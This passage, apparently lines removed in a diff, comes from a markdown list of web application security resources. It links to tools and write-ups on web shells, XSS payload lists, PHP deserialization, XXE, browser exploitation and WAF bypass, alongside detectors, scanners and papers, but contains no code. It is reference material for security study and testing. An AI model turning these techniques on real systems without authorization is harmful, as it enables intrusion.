-	* Tests for race conditions in web applications by sending out a user-specified number of requests to a target URL (or URLs) simultaneously, and then compares the responses from the server for uniqueness. Includes a number of configuration options.
-* [timing_attack](https://github.com/ffleming/timing_attack)
-	* Perform timing attacks against web applications
-fuse.ca/race-conditions-in-web-applications.htm)
-* [Race condition exploit](https://github.com/andresriancho/race-condition-exploit)
-	* Tool to help with the exploitation of web application race conditions
-
-
-
--------------------
-### Web Hooks
-* [Webhooks - pbworks](https://webhooks.pbworks.com/w/page/13385124/FrontPage)
-* [WebHook - Wikipedia](https://en.wikipedia.org/wiki/Webhook)
-* [Abusing Webhooks for Command and Control - Dimitry Snezhkov - BSides LV 2017](https://www.youtube.com/watch?v=TmLoTrJuung)
-	* [octohook](https://github.com/dsnezhkov/octohook)
-
-
-
-
--------------------
-### <a name="shells">Web Shells</a>
-Web Shells
-
-* Articles
-* Detection
-	* [Case Study: How Backdoors Bypass Security Solutions with Advanced Camouflage Techniques](https://www.incapsula.com/blog/backdoor-malware-analysis-obfuscation-techniques.html)
-		* Look at PHP obfuscation methods for webshells
-	* [NeoPI](https://github.com/Neohapsis/NeoPI)
-		* What is NeoPI? NeoPI is a Python script that uses a variety of statistical methods to detect obfuscated and encrypted content within text/script files. The intended purpose of NeoPI is to aid in the detection of hidden web shell code. The development focus of NeoPI was creating a tool that could be used in conjunction with other established detection methods such as Linux Malware Detect or traditional signature/keyword based searches.
-	* [Shell Detector](https://github.com/emposha/Shell-Detector)
-		* Shell Detector – is a application that helps you find and identify php/cgi(perl)/asp/aspx shells. Shell Detector has a “web shells” signature database that helps to identify “web shell” up to 99%.
-	* [Loki - Simple IOC Scanner](https://github.com/Neo23x0/Loki)
-		* Scanner for Simple Indicators of Compromise
-* Tools
-	* [Weevely](https://github.com/epinna/weevely3)
-		* Weevely is a command line web shell dinamically extended over the network at runtime used for remote administration and pen testing. It provides a weaponized telnet-like console through a PHP script running on the target, even in restricted environments.  The low footprint agent and over 30 modules shape an extensible framework to administrate, conduct a pen-test, post-exploit, and audit remote web accesses in order to escalate privileges and pivot deeper in the internal networks.
-		* [Getting Started](https://github.com/epinna/weevely3/wiki#getting-started)
-	* [b374k shell 3.2](https://github.com/b374k/b374k)
-		* This PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser
-	* [Simple websockets based webshell](http://ibreak.software/2015/02/18/simple-websockets-based-webshell/)
-	* [JSShell](https://github.com/Den1al/JSShell/)
-		* An interactive multi-user web based JS shell written in Python with Flask (for server side) and of course Javascript and HTML (client side). It was initially created to debug remote esoteric browsers during tests and research. I'm aware of other purposes this tool might serve, use it at your own responsibility and risk.
-	* [htshells](https://github.com/wireghoul/htshells)
-		* Self contained web shells and other attacks via .htaccess files.
-
-
--------------------
-### <a name="xss">XSS</a>
-* 101
-	* [3 Types of XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting)
-		* Reflected, Persistent, DOM-based
-* General
-	* [Postcards from a Post-XSS World - Michael Zalewski](http://lcamtuf.coredump.cx/postxss/#dangling-markup-injection)
-		* This page is a rough collection of notes on some of the fundamental alternatives to direct script injection that would be available to attackers following the universal deployment of CSP or other security mechanisms designed to prevent the execution of unauthorized scripts. I hope to demonstrate that in many cases, the capabilities offered by these alternative methods are highly compatible with the goals of contemporary XSS attacks.
-	* [Self XSS: we’re not so different you and I - Mathias Karlsson](https://www.youtube.com/watch?v=l3yThCIF7e4)
-* Testing
-	* [XSS Test String Dump](https://github.com/zsitro/XSS-test-dump/blob/master/xss.txt)
-	* [XSS Filter Bypass List](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
-	* [HTML Purifier XSS Attacks Smoketest](http://htmlpurifier.org/live/smoketests/xssAttacks.php)
-* Training
-	* [XSS-Game.appspot](https://xss-game.appspot.com/)
-	* [Firing-Range](https://github.com/google/firing-range)
-		* Firing Range is a test bed for web application security scanners, providing synthetic, wide coverage for an array of vulnerabilities.
-	* [XSSer](https://xsser.03c8.net/)
-	* [prompt.ml - XSS Injection Game](http://prompt.ml/about)
-	* [alert1 to win - XSS Injection Game](https://alf.nu/)
-* Tools
-	* [xsscrapy](https://github.com/byt3bl33d3r/xsscrapy)
-	* [XSS Sniper](https://sourceforge.net/projects/xssniper/)
-	* [Xenotix](https://github.com/ajinabraham/OWASP-Xenotix-XSS-Exploit-Framework)
-		* OWASP Xenotix XSS Exploit Framework is an advanced Cross Site Scripting (XSS) vulnerability detection and exploitation framework.
-	* [xssValidator](https://github.com/nVisium/xssValidator)
-		* This is a burp intruder extender that is designed for automation and validation of XSS vulnerabilities. 
-	* [Shuriken](https://github.com/shogunlab/shuriken)
-		* Cross-Site Scripting (XSS) command line tool for testing lists of XSS payloads on web apps.
-* Writeups
-	* [Writing an XSS Worm](http://blog.gdssecurity.com/labs/2013/5/8/writing-an-xss-worm.html)
-
-
- 
-
-
-
---------------------
-### <a name="api"></a>API Stuff
-API Related things
-* Fuzzing
-	* [Fuzzapi](https://github.com/lalithr95/Fuzzapi/)
-		* Fuzzapi is rails application which uses API_Fuzzer and provide UI solution for gem.
-	* [Automating API Penetration Testing using fuzzapi - AppSecUSA 2016](https://www.youtube.com/watch?v=43G_nSTdxLk)
-* General
-
-	* [WebSocket API Standards](https://www.w3.org/TR/2011/WD-websockets-20110929/)
-	* [White House Web API Standards](https://github.com/WhiteHouse/api-standards)
-		* This document provides guidelines and examples for White House Web APIs, encouraging consistency, maintainability, and best practices across applications. White House APIs aim to balance a truly RESTful API interface with a positive developer experience (DX).
-* Securing
-	* [RESTful API Best Practices and Common Pitfalls](https://medium.com/@schneidenbach/restful-api-best-practices-and-common-pitfalls-7a83ba3763b5)
-	* [OWASP API Security Project](https://www.owasp.org/index.php/OWASP_API_Security_Project)
-* Tools
-	* [Postman - chrome plugin](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop)
-	* [restclient - Firefox addon](https://addons.mozilla.org/de/firefox/addon/restclient/)
-
-
-
-
-
-
-
-
--------------------
-### <a name="atkb"Attacking Browsers</a>
-Attacking Browsers
-* [White Lightning Attack Platform](https://github.com/TweekFawkes/White_Lightning)
-* Browser Extensions
-	* [Attacking Browser Extensions](https://github.com/qll/attacking-browser-extensions)
-	* [Botnet in the Browser: Understanding Threats Caused by Malicious Browser Extensions](https://arxiv.org/pdf/1709.09577.pdf)
-	* [An in-depth look into Malicious Browser Extensions(2014)](http://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-into-malicious-browser-extensions/)
-* Exploiting
-	* [Smashing The Browser: From Vulnerability Discovery To Exploit](https://github.com/demi6od/Smashing_The_Browser)
-		* Goes from introducing a fuzzer to producing an IE11 0day
-	* [The Birth of a Complete IE11 Exploit Under the New Exploit Mitigations](https://www.syscan.org/index.php/download/get/aef11ba81927bf9aa02530bab85e303a/SyScan15%20Yuki%20Chen%20-%20The%20Birth%20of%20a%20Complete%20IE11%20Exploit%20Under%20the%20New%20Exploit%20Mitigations.pdf)
-	* [BeEF Browser Exploitation Framework](http://beefproject.com/)
-
-
-
-----------------
-###<a name="cms">CMS specific Tools</a>
-CMS Tools
-* General
-* Drupal
-	* [Drupal Security Checklist](https://github.com/gfoss/attacking-drupal/blob/master/presentation/drupal-security-checklist.pdf)
-	* [Drupal Attack Scripts](https://github.com/gfoss/attacking-drupal)
-		* Set of brute force scripts and Checklist	
-	* [Droopescan](https://github.com/droope/droopescan)
-		* A plugin-based scanner that aids security researchers in identifying issues with several CMSs, mainly Drupal & Silverstripe.
-* Joomla
-	* [Highly Effective Joomla Backdoor with Small Profile](http://blog.sucuri.net/2014/02/highly-effective-joomla-backdoor-with-small-profile.html)
-	* [JoomScan](https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project)
-		* Joomla! is probably the most widely-used CMS out there due to its flexibility, user-friendlinesss, extensibility to name a few.So, watching its vulnerabilities and adding such vulnerabilities as KB to Joomla scanner takes ongoing activity.It will help web developers and web masters to help identify possible security weaknesses on their deployed Joomla! sites. No web security scanner is dedicated only one CMS. 
-* Sharepoint
-	* [Sparty - Sharepoint/Frontpage Auditing Tool](https://github.com/alias1/sparty)
-		* Sparty is an open source tool written in python to audit web applications using sharepoint and frontpage architecture. The motivation behind this tool is to provide an easy and robust way to scrutinize the security configurations of sharepoint and frontpage based web applications. Due to the complex nature of these web administration software, it is required to have a simple and efficient tool that gathers information, check access permissions, dump critical information from default files and perform automated exploitation if security risks are identified. A number of automated scanners fall short of this and Sparty is a solution to that.
-* Wordpress
-	* [WPScan](https://github.com/wpscanteam/wpscan)
-		* WPScan is a black box WordPress vulnerability scanner. 
-	* [WPSeku](https://github.com/m4ll0k/WPSeku)
-		* Wordpress Security Scanner
-
-
-
-
-
-
-----------------
-### <a name="html5">HTML 5</a>
-HTML5
-* [HTML Standard Documentation](https://html.spec.whatwg.org/multipage/infrastructure.html#unicode-code-point)
-* [HTML5 Security Cheatsheet](https://github.com/cure53/H5SC)
-* [SH5ARK](http://sh5ark.professionallyevil.com)
-	* The Securing HTML5 Assessment Resource Kit, or SH5ARK, is an open source project that provides a repository of HTML5 features, proof-of-concept attack code, and filtering rules. The purpose of this project is to provide a single repository that can be used to collect sample code of vulnerable HTML5 features, actual attack code, and filtering rules to help prevent attacks and abuse of these features. The intent of the project is to bring awareness to the opportunities that HTML5 is providing for attackers, to help identify these attacks, and provide measures for preventing them
-	* [Presentation on SH5ARK](https://www.youtube.com/watch?v=1ZZ-vIwmWx4)
-	* [GetSH5ARK here](http://sourceforge.net/projects/sh5ark/)
-
-
-----------------
-### <a name="javascript">JavaScript</a>
-JavaScript
-* General
-	* [DOM Clobbering Attack](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)
-* Tools
-	* [JSDetox](http://relentless-coding.org/projects/jsdetox/info)
-		* JSDetox is a tool to support the manual analysis of malicious Javascript code. 
-	* [Dom Flow - Untangling The DOM For More Easy-Juicy Bugs  - BH USA 2015](https://www.youtube.com/watch?v=kedmtrIEW1k&list=PLH15HpR5qRsXF78lrpWP2JKpPJs_AFnD7&index=111)
-	
-
-----------------
-### Java Server Faces (JSF)
-[Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - alphabot](https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html)
-
-
-
-
---------------
-### <a name="php"></a>PHP
-
-[Browser Security Whitepaper - Cure53](https://cure53.de/browser-security-whitepaper.pdf/)
-
-[OWASP Proactive Controls 3.0](https://docs.google.com/document/d/1bQKisfXQ2XRwkcUaTvVTR7bpzVgbwIhDA1O6hUbywiY/mobilebasic)
-
-[Php Codz Hacking](https://github.com/80vul/phpcodz)
-* Writeups of specific PHP vulns
-
-
-#### Code Reuse
-
-[The ReflectionClass class](https://secure.php.net/ReflectionClass)
-
-[Autoloading Classes](http://www.php.net/language.oop5.autoload)
-
-[PHP Autoload Invalid Classname Injection](https://hakre.wordpress.com/2013/02/10/php-autoload-invalid-classname-injection/)
-
-[Code Reuse Attacks in PHP: Automated POP Chain Generation](https://www.syssec.rub.de/media/emma/veroeffentlichungen/2014/09/10/POPChainGeneration-CCS14.pdf)
-* In  this  paper, we study code reuse attacks in the con- text of PHP-based web applications. We analyze how PHP object injection (POI) vulnerabilities  can  be exploited via property-oriented programming (POP) and perform a systematic analysis of available gadgets in common PHP applications. Furthermore, we introduce an automated approach to statically detect  POI  vulnerabilities  in  object-oriented PHP code. Our approach is also capable of generating POP chains in an automated way. We implemented a prototype of the proposed approach and evaluated it with 10 well-known applications. Overall, we detected 30 new POI vulnerabilities and 28 new gadget chains
-
-[Utilizing Code Reuse/ROP in PHP Application Exploits - BH 2010](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)
-
-[POP-Exploit](https://github.com/enddo/POP-Exploit)
-* Research into Property Oriented Programming about php applications.
-
-
-#### De/Serialization
-
-[serialize - php](http://us3.php.net/serialize)
-
-[unserialize - php](https://secure.php.net/unserialize)
-
-[PHP Object Injection](https://www.owasp.org/index.php/PHP_Object_Injection)
-
-[Writing Exploits For Exotic Bug Classes: unserialize()](https://www.alertlogic.com/blog/writing-exploits-for-exotic-bug-classes-unserialize()/)
-
-[Is PHP unserialize() exploitable without any 'interesting' methods? - StackOverflow](https://security.stackexchange.com/questions/77549/is-php-unserialize-exploitable-without-any-interesting-methods)
-
-[Remote code execution via PHP [Unserialize] - notsosecure](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/)
-
-
-#### Type Juggling
-[Writing Exploits For Exotic Bug Classes: PHP Type Juggling](https://turbochaos.blogspot.com.au/2013/08/exploiting-exotic-bugs-php-type-juggling.html)
-
-[PHP Magic Tricks: Type Juggling](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)
-
-[PHP’s “Magic Hash” Vulnerability (Or Beware Of Type Juggling)](https://web.archive.org/web/20150530075600/http://blog.astrumfutura.com/2015/05/phps-magic-hash-vulnerability-or-beware-of-type-juggling)
-
-
-
-
-
-
-
-----------------
-### <a name="rest"></a>REST/SOAP/Web Services(WSDL)
-
-
-#### Learning/Reference
-
-[RESTful Services, The Web Security Blind Spot](https://www.youtube.com/watch?feature=player_embedded&v=pWq4qGLAZHI#!)
-* [Blogpost](https://xiom.com/2016/10/31/restful-services-web-security-blind-spot/)
-* [Presentation Slides -pdf](https://xiomcom.files.wordpress.com/2016/10/security-testing-for-rest-applications-v6-april-2013.pdf)
-
-[Cracking and Fixing REST APIs](http://www.sempf.net/post/Cracking-and-Fixing-REST-APIs)
-
-[Cracking and fixing REST services](http://www.irongeek.com/i.php?page=videos/converge2015/track109-cracking-and-fixing-rest-services-bill-sempf)
-
-[Representational State Transfer - Wikipedia](https://en.wikipedia.org/wiki/Representational_state_transfer)
-
-[Web Services Security Testing Cheat Sheet Introduction - OWASP](https://www.owasp.org/index.php/Web_Service_Security_Testing_Cheat_Sheet)
-
-[Service-Oriented-Architecture](https://en.wikipedia.org/wiki/Service-oriented_architecture)
-
-[Microservices](https://en.wikipedia.org/wiki/Microservices)
-
-[Learn REST: A Tutorial](http://rest.elkstein.org/)
-
-
-
-#### Attacking
-
-[REST Security Cheat Sheet](REST Security Cheat Sheet)
-
-[REST Assessment Cheat Sheet](https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet)
-
-[Damn Vulnerable Web Services dvws](https://github.com/snoopysecurity/dvws)
-* Damn Vulnerable Web Services is an insecure web application with multiple vulnerable web service components that can be used to learn real world web service vulnerabilities.
-
-[WS-Attacker](https://github.com/RUB-NDS/WS-Attacker)
-* WS-Attacker is a modular framework for web services penetration testing. It is developed by the Chair of Network and Data Security, Ruhr University Bochum (http://nds.rub.de/ ) and the Hackmanit GmbH (http://hackmanit.de/).
-
-[WS-Attacks.org](http://www.ws-attacks.org/Welcome_to_WS-Attacks)
-* WS-Attacks.org is not a new web service standard by the OASIS Group or W3C; instead it presents the flaws of today's web service standards and implementations in regard to web service security! WS-Attacks.org aims at delivering the most comprehensive enumeration of all known web service attacks.
-
-[Exploiting CVE-2017-8759: SOAP WSDL Parser Code Injection](https://www.mdsec.co.uk/2017/09/exploiting-cve-2017-8759-soap-wsdl-parser-code-injection/)
-
-
-* [The S stands for Simple](http://harmful.cat-v.org/software/xml/soap/simple)
-	* Satire(Only it's not) of a conversation about SOAP
-
-
-
-
---------------------------------
-### <a name="ruby"></a>Ruby/Ruby on Rails
-Ruby/RoR
-* General
-	* [Ruby on Rails Security Guide](http://guides.rubyonrails.org/security.html)
-	* [Ruby on Rails Cheatsheet - OWASP](https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet)
-	* [Executing commands in ruby](http://blog.bigbinary.com/2012/10/18/backtick-system-exec-in-ruby.html)
-	* [Attacking Ruby on Rails Applications - phrack](http://phrack.org/issues/69/12.html#article)
-	* [Going AUTH the Rails on a Crazy Train: A Dive into Rails Authentication and Authorization](https://www.blackhat.com/docs/eu-15/materials/eu-15-Jarmoc-Going-AUTH-The-Rails-On-A-Crazy-Train-wp.pdf)
-	* [Property Oriented Programming - Applied to Ruby](https://slides.com/benmurphy/property-oriented-programming/fullscreen#/)
-	* [Pentesting Django and Rails](https://es.slideshare.net/levigross/pentesting-django-and-rails)
-	
-
-
-
-
------------------
-### <a name="scraping"></a>Scraping
-[WeasyPrint](http://weasyprint.org/)
-* WeasyPrint is a visual rendering engine for HTML and CSS that can export to PDF. It aims to support web standards for printing. WeasyPrint is free software made available under a BSD license.
-
-[Scrapy](https://scrapy.org/)
-* An open source and collaborative framework for extracting the data you need from websites. 
-
-
-
-
-
-
-
-----------------
-### <a name="scanners"></a>Site/Webapp Scanners
-
-[nikto]()
-
-[Spaghetti - Web Application Security Scanner](https://github.com/m4ll0k/Spaghetti)
-* Spaghetti is an Open Source web application scanner, it is designed to find various default and insecure files, configurations, and misconfigurations. Spaghetti is built on python2.7 and can run on any platform which has a Python environment.
-
-[skipfish](https://code.google.com/p/skipfish/)
-* Skipfish is an active web application security reconnaissance tool. It prepares an interactive sitemap for the targeted site by carrying out a recursive crawl and dictionary-based probes. The resulting map is then annotated with the output from a number of active (but hopefully non-disruptive) security checks. The final report generated by the tool is meant to serve as a foundation for professional web application security assessments. 
-
-[wikto](https://github.com/sensepost/wikto)
-* Wikto is Nikto for Windows - but with a couple of fancy extra features including Fuzzy logic error code checking, a back-end miner, Google assisted directory mining and real time HTTP request/response monitoring. Wikto is coded in C# and requires the .NET framework. 
-
-[RAWR - Rapid Assessment of Web Resources](https://bitbucket.org/al14s/rawr/wiki/Home)
-
-[Arachni Web Scanner](http://www.arachni-scanner.com/)
-* Arachni is an Open Source, feature-full, modular, high-performance Ruby framework aimed towards helping penetration testers and administrators evaluate the security of web applications.  It is smart, it trains itself by monitoring and learning from the web application's behavior during the scan process and is able to perform meta-analysis using a number of factors in order to correctly assess the trustworthiness of results and intelligently identify (or avoid) false-positives. 
-
-[WhatWeb](https://github.com/urbanadventurer/WhatWeb)
-* WhatWeb identifies websites. Its goal is to answer the question, "What is that Website?". WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1500 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.
-
-[WATOBO](https://github.com/siberas/watobo)
-* WATABO is a security tool for testing web applications. It is intended to enable security professionals to perform efficient (semi-automated) web application security audits.
-
-[YASUO](https://github.com/0xsauby/yasuo)
-* Yasuo is a ruby script that scans for vulnerable 3rd-party web applications.
-
-[CMSExplorer](https://code.google.com/p/cms-explorer/)
-* CMS Explorer is designed to reveal the the specific modules, plugins, components and themes that various CMS driven web sites are running. Additionally, CMS Explorer can be used to aid in security testing. While it performs no direct security checks, the "explore" option can be used to reveal hidden/library files which are not typically accessed by web clients but are nonetheless accessible. This is done by retrieving the module's current source tree and then requesting those file names from the target system. These requests can be sent through a distinct proxy to help "bootstrap" security testing tools like Burp, Paros, Webinspect, etc. 
-
-[BlindElephant Web Application Fingerprinter](http://blindelephant.sourceforge.net/)
-* The BlindElephant Web Application Fingerprinter attempts to discover the version of a (known) web application by comparing static files at known locations against precomputed hashes for versions of those files in all all available releases. The technique is fast, low-bandwidth, non-invasive, generic, and highly automatable. 
-
-[ParrotNG](https://github.com/ikkisoft/ParrotNG)
-* ParrotNG is a tool capable of identifying Adobe Flex applications (SWF) vulnerable to CVE-2011-2461
-
-[OpenDoor](https://github.com/stanislav-web/OpenDoor)
-* OpenDoor OWASP is console multifunctional web sites scanner. This application find all possible ways to login, index of/ directories, web shells, restricted access points, subdomains, hidden data and large backups. The scanning is performed by the built-in dictionary and external dictionaries as well. Anonymity and speed are provided by means of using proxy servers.
-
-
-
-----------------
-### <a name="websocket"></a>Web Sockets
-
-[The WebSocket Protocol Standard - IETF](https://tools.ietf.org/html/rfc6455)
-
-[WebSocket Protocol - RFC Draft 17](https://tools.ietf.org/html/draft-ietf-hybi-thewebsocketprotocol-17)
-
-
-
-
-
-
-----------------
-### <a name="webproxy">Web Proxies</a>
-Web Proxies
-* [Burpsuite](http://portswigger.net/burp/)
-	* Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities. 
-* [ZAP - Zed Attack Proxy](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)
-	* The Zed Attack Proxy (ZAP) is an easy to use integrated penetration testing tool for finding vulnerabilities in web applications.  It is designed to be used by people with a wide range of security experience and as such is ideal for developers and functional testers who are new to penetration testing.  ZAP provides automated scanners as well as a set of tools that allow you to find security vulnerabilities manually.
-* [Paros - Web Proxy](http://sourceforge.net/projects/paros/)
-	* A Java based HTTP/HTTPS proxy for assessing web application vulnerability. It supports editing/viewing HTTP messages on-the-fly. Other featuers include spiders, client certificate, proxy-chaining, intelligent scanning for XSS and SQL injections etc.
-* [Mallory: Transparent TCP and UDP Proxy](https://intrepidusgroup.com/insight/mallory/)
-	* Mallory is a transparent TCP and UDP proxy. It can be used to get at those hard to intercept network streams, assess those tricky mobile web applications, or maybe just pull a prank on your friend.
-* [TCP Catcher](http://www.tcpcatcher.org/)
-	* TcpCatcher is a free TCP, SOCKS, HTTP and HTTPS proxy monitor server software. 
-* [wssip](https://github.com/nccgroup/wssip)
-	* Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.
-
-
---------------
-### WebRTC
-
-[STUN IP Address requests for WebRTC](https://github.com/diafygi/webrtc-ips)
-
-
-
-
-
-
-
-----------------
-### <a name="waf">Web Application Firewalls(WAFs)</a>
-
-
-[ModSecurity](https://github.com/SpiderLabs/ModSecurity)
-* ModSecurity is an open source, cross platform web application firewall (WAF) engine for Apache, IIS and Nginx that is developed by Trustwave's SpiderLabs. It has a robust event-based programming language which provides protection from a range of attacks against web applications and allows for HTTP traffic monitoring, logging and real-time analys
-
-[Shadow Daemon](https://shadowd.zecure.org/overview/introduction/)
-* Shadow Daemon is a collection of tools to detect, protocol and prevent attacks on web applications. Technically speaking, Shadow Daemon is a web application firewall that intercepts requests and filters out malicious parameters. It is a modular system that separates web application, analysis and interface to increase security, flexibility and expandability. Shadow Daemon is free software. It is released under the license GPLv2, so its source code can be examined, modified and distributed by everyone.
-
-[ftw](https://github.com/fastly/ftw)
-* Framework for Testing WAFs (FTW!)
-
-
-
-
-
-
-----------------
-### <a name="bwaf">Bypassing Web Application Firewalls</a>
-[Bypassing WAFs](http://www.nethemba.com/bypassing-waf.pdf)
-
-[WAFPASS](https://github.com/wafpassproject/wafpass)
-* Analysing parameters with all payloads' bypass methods, aiming at benchmarking security solutions like WAF.
-
-
-
-
-----------------
-### <a name="writeups">Web Application Attack Write-ups</a>
-
-[Hacking with Pictures - Syscan2015](http://www.slideshare.net/saumilshah/hacking-with-pictures-syscan-2015)
-
-
-[Relative Path Overwrite Explanation/Writeup](http://www.thespanner.co.uk/2014/03/21/rpo/)
-* RPO (Relative Path Overwrite) is a technique to take advantage of relative URLs by overwriting their target file. To understand the technique we must first look into the differences between relative and absolute URLs. An absolute URL is basically the full URL for a destination address including the protocol and domain name whereas a relative URL doesn’t specify a domain or protocol and uses the existing destination to determine the protocol and domain.
-
-
-ColdFusion
-* [Attacking Adobe ColdFusion](http://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html)
-* [ColdFusion Security Resources](https://www.owasp.org/index.php/ColdFusion_Security_Resources)
-* [ColdFusion for Penetration Testers](http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers)
-
-
-
-PHP
-* [PHP Generic Gadget Chains: Exploiting unserialize in unknown environments](https://www.ambionics.io/blog/php-generic-gadget-chains)
-* [PHPGGC: PHP Generic Gadget Chains](https://github.com/ambionics/phpggc)
-	* PHPGGC is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically. When encountering an unserialize on a website you don't have the code of, or simply when trying to build an exploit, this tool allows you to generate the payload without having to go through the tedious steps of finding gadgets and combining them. Currently, the tool supports: Doctrine, Guzzle, Laravel, Monolog, Slim, SwiftMailer.
-* [Pwning PHP mail() function For Fun And RCE | New Exploitation Techniques And Vectors](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
-
-[Abusing Google App Scripting Through Social Engineering](http://www.redblue.team/2017/02/abusing-google-app-scripting-through.html)
-
-[File scanner web app (Part 1 of 5): Stand-up and webserver](http://0xdabbad00.com/2013/09/02/file-scanner-web-app-part-1-of-5-stand-up-and-webserver/)
-
-Serial
-[Exploiting misuse of Python's "pickle"](https://blog.nelhage.com/2011/03/exploiting-pickle/)
-
-
-[Typosquatting programming language package managers](http://incolumitas.com/2016/06/08/typosquatting-package-managers/)
-
-
-CI
-[Hacking Jenkins Servers With No Password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
-
-
-[ebay.com: RCE using CCS](http://secalert.net/#ebay-rce-ccs)
-
-
-[Exploiting Python Code Injection in Web Applications](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)
-
-
-[Unrestricted File Upload Security Testing - Aptive](https://www.aptive.co.uk/blog/unrestricted-file-upload-testing/)
-
-
-
-
-
-----------------
-### Web Assembly
-Web Assembly
-* [Web Assembly](http://webassembly.org/)
-* [A cartoon intro to WebAssembly Articles](https://hacks.mozilla.org/category/code-cartoons/a-cartoon-intro-to-webassembly/)
-* [Lin Clark: A Cartoon Intro to WebAssembly | JSConf EU 2017](https://www.youtube.com/watch?v=HktWin_LPf4&app=desktop)
-
-
-----------------
-### WebUSB
-WebUSB
-* [WebUSB API - Sept2017](https://wicg.github.io/webusb/)
-
-
-
-
-
-
-
-
-----------------
-### XML
-* [Hunting in the Dark - Blind XXE](https://blog.zsec.uk/blind-xxe-learning/)
-* [Leading the Blind to Light! - A Chain to RCE](https://blog.zsec.uk/rce-chain/)
-* [What You Didn't Know About XML External Entities Attacks](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)
-* [Black Hat EU 2013 - XML Out-of-Band Data Retrieval](https://www.youtube.com/watch?v=eBm0YhBrT_c)
-	* [Slides: XML Out-­Of-Band Data Retrieval - BHEU 2013](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
-* [Generic XXE Detection](http://www.christian-schneider.net/GenericXxeDetection.html)
-* [Advice From A Researcher: Hunting XXE For Fun and Profit](http://blog.bugcrowd.com/advice-from-a-researcher-xxe/)
-* [XXEinjector](https://github.com/enjoiz/XXEinjector)
-	* XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications
-* [Playing with Content-Type – XXE on JSON Endpoints - NETSPI](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/)
-* [FileCry - The New Age of XXE - BH USA 2015](https://www.blackhat.com/docs/us-15/materials/us-15-Wang-FileCry-The-New-Age-Of-XXE.pdf)
-* [XXE OOB exploitation at Java 1.7+ - 2014](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)
-* [Security of applications that parse XML (supplementary) - 2009](http://d.hatena.ne.jp/teracc/20090718)
-* [XXEInjector](https://github.com/enjoiz/XXEinjector)
-	* XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.
-* [Exploiting XXE In File Upload Functionality](https://www.blackhat.com/docs/us-15/materials/us-15-Vandevanter-Exploiting-XXE-Vulnerabilities-In-File-Parsing-Functionality.pdf)
-
-
-
-
-
-
-
-
-----------------
-### <a name="papers">Papers
-
-[The Spy in the Sandbox – Practical Cache Attacks in Javascript](http://iss.oy.ne.ro/SpyInTheSandbox.pdf)
-* We present the first micro-architectural side-channel at- tack which runs entirely in the browser. In contrast to other works in this genre, this attack does not require the attacker to install any software on the victim’s machine – to facilitate the attack, the victim needs only to browse to an untrusted webpage with attacker-controlled con- tent. This makes the attack model highly scalable and ex- tremely relevant and practical to today’s web, especially since most desktop browsers currently accessing the In- ternet are vulnerable to this attack. Our attack, which is an extension of the last-level cache attacks of Yarom et al. [23], allows a remote adversary recover information belonging to other processes, other users and even other virtual machines running on the same physical host as the victim web browser. We describe the fundamentals behind our attack, evaluate its performance using a high bandwidth covert channel and finally use it to construct a system-wide mouse/network activity logger. Defending against this attack is possible, but the required counter- measures can exact an impractical cost on other benign uses of the web browser and of the computer.
-
-[Self-Exfiltration: The Dangers of Browser-Enforced Information Flow Control](http://ericchen.me/self_exfiltration.pdf)
-* Abstract —Since the early days of Netscape, browser vendors and web security researchers have restricted out-going data based on its destination. The security argument accompanying these mechanisms is that they prevent sensitive user data from being sent to the attacker’s domain. However, in this paper, we show that regulating web information flow based on its destination server is an inherently flawed security practice. It is vulnerable to self-exfiltration attacks, where an adversary stashes stolen information in the database of a whitelisted site, then later independently connects to the whitelisted site to retrieve the information. We describe eight existing browser security mechanisms that are vulnerable to these “self-exfiltration” attacks. Furthermore, we discovered at least one exfiltration channel for each of the Alexa top 100 websites. None of the existing information flow control mechanisms we surveyed are sufficient to protect data from being leaked to the attacker. Our goal is to prevent browser vendors and researchers from falling into this trap by designing more systems that are vulnerable to self-exfiltration.
-
-[The Devil is in the Constants: Bypassing Defenses in Browser JIT Engines](http://users.ics.forth.gr/~elathan/papers/ndss15.pdf)
